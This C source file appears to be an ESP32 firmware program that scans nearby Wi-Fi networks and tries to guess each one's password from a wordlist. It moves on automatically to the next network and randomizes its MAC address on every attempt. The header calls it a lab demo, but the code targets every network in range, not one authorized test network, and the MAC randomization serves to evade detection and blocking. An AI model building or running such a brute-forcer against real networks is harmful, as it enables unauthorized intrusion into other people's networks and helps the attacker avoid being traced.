/* lab_dict_device_clean_mac.c
   ESP-IDF demo: scan -> iterate APs -> wordlist attempts -> auto next AP
   Adds MAC randomization on every connection attempt
*/

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "esp_system.h"

/* --- CONFIG --- */
#define MAX_SSID_LEN   32
#define MAX_PASS_LEN   64
#define MAX_APS        20
#define MAX_ATTEMPTS_PER_AP   50
#define GLOBAL_MAX_ATTEMPTS   1000
#define CONNECT_TIMEOUT_MS    7000
#define POLITE_DELAY_MS       1500

static const char *TAG = "ESP_BRUTE";

/* Example wordlist  */
/* 20,000  password  */
const char *wordlist[] = {
	"Abcd1dcbA1",

	"12345678"
    
};
static const int wordlist_size = sizeof(wordlist) / sizeof(wordlist[0]);

/* Wi-Fi event group bits */
static EventGroupHandle_t wifi_event_group;
const int WIFI_CONNECTED_BIT = BIT0;
const int WIFI_FAIL_BIT      = BIT1;

/* Scanned AP storage */
static wifi_ap_record_t ap_list[MAX_APS];
static int ap_count = 0;

/* --- Wi-Fi / IP event handler --- */
static void wifi_event_handler(void* arg, esp_event_base_t event_base,
                               int32_t event_id, void* event_data)
{
    if (event_base == WIFI_EVENT) {
        if (event_id == WIFI_EVENT_STA_DISCONNECTED) {
            xEventGroupSetBits(wifi_event_group, WIFI_FAIL_BIT);
        }
    } else if (event_base == IP_EVENT) {
        if (event_id == IP_EVENT_STA_GOT_IP) {
            xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
        }
    }
}

/* --- Blocking Wi-Fi scan --- */
static void scan_wifi_blocking(void)
{
    ESP_LOGI(TAG, "Scanning Wi-Fi...");
    esp_err_t err = esp_wifi_scan_start(NULL, true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_scan_start failed: %d", err);
        ap_count = 0;
        return;
    }

    uint16_t num = MAX_APS;
    if (esp_wifi_scan_get_ap_records(&num, ap_list) != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_scan_get_ap_records failed");
        ap_count = 0;
        return;
    }
    ap_count = num;
    ESP_LOGI(TAG, "Found %d AP(s).", ap_count);
    for (int i = 0; i < ap_count; i++) {
        uint8_t *b = ap_list[i].bssid;
        printf("%d: %s (RSSI %d) BSSID %02x:%02x:%02x:%02x:%02x:%02x\n",
               i, ap_list[i].ssid, ap_list[i].rssi,
               b[0], b[1], b[2], b[3], b[4], b[5]);
    }
}

/* --- Randomize MAC --- */
static void randomize_sta_mac(void)
{
    uint8_t mac[6];
    esp_efuse_mac_get_default(mac); // get base MAC
    // Randomize last 3 bytes
    mac[3] = esp_random() & 0xFF;
    mac[4] = esp_random() & 0xFF;
    mac[5] = esp_random() & 0xFF;

    esp_err_t e = esp_wifi_set_mac(WIFI_IF_STA, mac);
    if (e == ESP_OK) {
        ESP_LOGI(TAG, "Randomized MAC: %02x:%02x:%02x:%02x:%02x:%02x",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        ESP_LOGW(TAG, "Failed to set random MAC: %d", e);
    }
}

/* --- Try connecting to AP with password --- */
static bool try_password_connect(const char *ssid, const char *password)
{
    if (!ssid || !password) return false;

    wifi_config_t wifi_config = {0};
    strncpy((char*)wifi_config.sta.ssid, ssid, MAX_SSID_LEN - 1);
    strncpy((char*)wifi_config.sta.password, password, MAX_PASS_LEN - 1);

    ESP_LOGI(TAG, "Attempting connect -> SSID:\"%s\" PASS:\"%s\"", ssid, password);

    // Clear previous bits
    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT | WIFI_FAIL_BIT);

    // Ensure disconnected
    esp_err_t e = esp_wifi_disconnect();
    if (e != ESP_OK && e != ESP_ERR_WIFI_NOT_STARTED) {
        ESP_LOGW(TAG, "esp_wifi_disconnect returned %d", e);
    }

    vTaskDelay(pdMS_TO_TICKS(1000)); // wait for disconnect

    // Randomize MAC before connecting
    randomize_sta_mac();

    // Apply config and connect
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_connect());

    // Wait for connection or fail
    EventBits_t bits = xEventGroupWaitBits(
        wifi_event_group,
        WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,
        pdTRUE,     // clear bits on exit
        pdFALSE,    // wait for any bit
        pdMS_TO_TICKS(CONNECT_TIMEOUT_MS)
    );

    if (bits & WIFI_CONNECTED_BIT) {
        // Connected, verify SSID
        wifi_ap_record_t info;
        if (esp_wifi_sta_get_ap_info(&info) == ESP_OK) {
            if (strncmp((const char*)info.ssid, ssid, MAX_SSID_LEN) == 0) {
                ESP_LOGI(TAG, "Connected -> SSID:%s RSSI:%d", info.ssid, info.rssi);
                esp_wifi_disconnect();
                vTaskDelay(pdMS_TO_TICKS(500));
                return true;
            } else {
                ESP_LOGW(TAG, "Connected SSID mismatch: expected '%s', got '%s'", ssid, info.ssid);
                esp_wifi_disconnect();
                vTaskDelay(pdMS_TO_TICKS(500));
                return false;
            }
        } else {
            ESP_LOGW(TAG, "Failed to get AP info after connect");
            esp_wifi_disconnect();
            vTaskDelay(pdMS_TO_TICKS(500));
            return false;
        }
    } else if (bits & WIFI_FAIL_BIT) {
        ESP_LOGI(TAG, "Connection failed for SSID '%s' with PASS '%s'", ssid, password);
        return false;
    } else {
        ESP_LOGI(TAG, "Connect attempt timed out (%d ms) for SSID '%s'", CONNECT_TIMEOUT_MS, ssid);
        esp_wifi_disconnect();
        vTaskDelay(pdMS_TO_TICKS(500));
        return false;
    }
}

/* --- Wordlist attempts for a single SSID --- */
static bool try_wordlist(const char *ssid, int *global_attempts)
{
    int attempts_for_ap = 0;
    for (int i = 0; i < wordlist_size; i++) {
        if (*global_attempts >= GLOBAL_MAX_ATTEMPTS) return false;
        if (attempts_for_ap >= MAX_ATTEMPTS_PER_AP) break;

        if (try_password_connect(ssid, wordlist[i])) {
            printf("\n*** SUCCESS: SSID: %s  PASSWORD: %s\n", ssid, wordlist[i]);
            return true;
        }

        (*global_attempts)++;
        attempts_for_ap++;
        vTaskDelay(pdMS_TO_TICKS(POLITE_DELAY_MS));
    }
    return false;
}

/* --- Main flow task --- */
static void flow_task(void *arg)
{
    int global_attempts = 0;

    while (1) {
        scan_wifi_blocking();
        if (ap_count == 0) {
            ESP_LOGW(TAG, "No APs found, retrying in 5s...");
            vTaskDelay(pdMS_TO_TICKS(5000));
            continue;
        }

        for (int ap_index = 0; ap_index < ap_count; ap_index++) {
            const char *ssid = (const char*)ap_list[ap_index].ssid;
            ESP_LOGI(TAG, "Attempting SSID: %s", ssid);

            bool ok = try_wordlist(ssid, &global_attempts);
            if (ok) {
                ESP_LOGI(TAG, "Password found.");
                goto done;
            }
            ESP_LOGI(TAG, "Wordlist exhausted for SSID %s, moving to next AP...", ssid);
        }

        ESP_LOGI(TAG, "All scanned APs tried, rescanning in 2s...");
        vTaskDelay(pdMS_TO_TICKS(2000));
    }

done:
    ESP_LOGI(TAG, "Flow finished, entering idle loop.");
   // while (1) vTaskDelay(pdMS_TO_TICKS(10000));
}

/* --- app_main --- */
void app_main(void)
{
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    wifi_event_group = xEventGroupCreate();
    esp_netif_create_default_wifi_sta();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                        IP_EVENT_STA_GOT_IP,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    xTaskCreate(flow_task, "flow_task", 16 * 1024, NULL, 5, NULL);
}
